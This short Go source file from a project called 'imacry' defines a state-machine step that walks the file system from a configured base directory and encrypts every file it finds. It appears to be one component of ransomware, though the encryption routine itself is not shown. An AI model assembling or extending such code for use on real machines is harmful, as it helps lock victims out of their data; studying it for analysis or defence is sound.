package state

import (
	"fmt"

	"github.com/prairir/imacry/pkg/config"
	"github.com/prairir/imacry/pkg/encryptfile"
	"github.com/prairir/imacry/pkg/walk"
)

// state.Encrypt: encrypt file system starting at config.Config.Base
// params: next state
// returns: error
func Encrypt(nextState config.State) error {
	ef := encryptfile.EncryptFile{}
	err := walk.Walk(config.Config.Base, ef)
	if err != nil {
		return fmt.Errorf("state.Encrypt error: %w", err)
	}

	config.Config.State = nextState
	return nil
}
